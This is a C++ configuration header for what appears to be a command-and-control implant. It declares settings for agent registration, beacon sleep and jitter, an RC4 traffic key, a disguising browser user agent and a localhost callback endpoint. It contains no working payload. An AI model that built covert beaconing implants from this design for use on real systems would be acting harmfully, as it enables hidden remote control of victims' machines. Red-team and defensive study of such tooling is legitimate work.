#pragma once

#include <string>
#include <iostream>

// Build Configuration
#ifdef _DEBUG
#define VERBOSE 1
#else
#define VERBOSE 0
#endif

// Debug output macros
#if VERBOSE
#define PRINTF(f_, ...) printf((f_), __VA_ARGS__)
#define CERR(x) std::cerr << x
#define COUT(x) std::cout << x
#else
#define PRINTF(f_, ...)
#define CERR(x)
#define COUT(x)
#endif

// Security defines
#define no_init_all
#define _CRT_SECURE_NO_WARNINGS

// NT Status helper
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// Network Configuration Constants
#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 9090
#define API_ENDPOINT "/api/send"
#define USERAGENT "Mozilla/5.0"
#define C2SSL FALSE

// Timing Configuration Constants
#define SLEEP_TIME 10      // seconds between polling
#define MAX_RETRIES 3
#define RETRY_SLEEP 3000   // 3 seconds

// File Operation Constants
#define FILE_CHUNK_SIZE 4096

// Default Jitter Settings
#define DEFAULT_JITTER_MAX 30
#define DEFAULT_JITTER_MIN 25

namespace Config {

    /**
     * Initialize the configuration system
     * Loads any configuration from files, registry, or environment
     * @return true if initialization successful
     */
    bool Initialize();

    /**
     * Cleanup configuration system
     */
    void Cleanup();

    // Agent Configuration Management
    namespace Agent {
        /**
         * Get the current agent ID
         * @return Agent ID string, empty if not set
         */
        std::string GetId();

        /**
         * Set the agent ID
         * @param id Agent ID to set
         */
        void SetId(const std::string& id);

        /**
         * Check if agent is registered (has valid ID)
         * @return true if agent has ID
         */
        bool IsRegistered();

        /**
         * Clear the agent ID (for cleanup/reset)
         */
        void ClearId();
    }

    // Sleep and Jitter Configuration
    namespace Sleep {
        /**
         * Get current sleep time in seconds
         * @return Sleep time
         */
        int GetSleepTime();

        /**
         * Set sleep time
         * @param sleepTime Sleep time in seconds
         */
        void SetSleepTime(int sleepTime);

        /**
         * Get maximum jitter percentage
         * @return Max jitter percentage
         */
        int GetJitterMax();

        /**
         * Set maximum jitter percentage
         * @param jitterMax Max jitter percentage
         */
        void SetJitterMax(int jitterMax);

        /**
         * Get minimum jitter percentage
         * @return Min jitter percentage
         */
        int GetJitterMin();

        /**
         * Set minimum jitter percentage
         * @param jitterMin Min jitter percentage
         */
        void SetJitterMin(int jitterMin);

        /**
         * Update all sleep configuration at once
         * @param sleepTime Sleep time in seconds
         * @param jitterMax Maximum jitter percentage
         * @param jitterMin Minimum jitter percentage
         */
        void UpdateConfig(int sleepTime, int jitterMax, int jitterMin);

        /**
         * Get all sleep configuration at once
         * @param sleepTime Output: current sleep time
         * @param jitterMax Output: current max jitter
         * @param jitterMin Output: current min jitter
         */
        void GetConfig(int& sleepTime, int& jitterMax, int& jitterMin);

        /**
         * Reset sleep configuration to defaults
         */
        void ResetToDefaults();
    }

    // Crypto Configuration
    namespace Crypto {
        /**
         * Get the RC4 encryption key
         * @return RC4 key string
         */
        std::string GetRC4Key();

        /**
         * Set the RC4 encryption key
         * @param key RC4 key to set
         */
        void SetRC4Key(const std::string& key);
    }

    // Network Configuration
    namespace Network {
        /**
         * Get server IP address
         * @return Server IP string
         */
        std::string GetServerIP();

        /**
         * Get server port
         * @return Server port number
         */
        int GetServerPort();

        /**
         * Get API endpoint path
         * @return API endpoint string
         */
        std::string GetAPIEndpoint();

        /**
         * Get user agent string
         * @return User agent string
         */
        std::string GetUserAgent();

        /**
         * Check if SSL is enabled
         * @return true if SSL enabled
         */
        bool IsSSLEnabled();

        /**
         * Get maximum retry attempts
         * @return Max retry count
         */
        int GetMaxRetries();

        /**
         * Get retry sleep time in milliseconds
         * @return Retry sleep time
         */
        int GetRetrySleep();

        /**
         * Update network configuration
         * @param serverIP Server IP address
         * @param serverPort Server port
         * @param useSSL Whether to use SSL
         */
        void UpdateServerConfig(const std::string& serverIP, int serverPort, bool useSSL);
    }

} // namespace Config

// Convenience macros for accessing configuration
#define RC4_KEY Config::Crypto::GetRC4Key().c_str()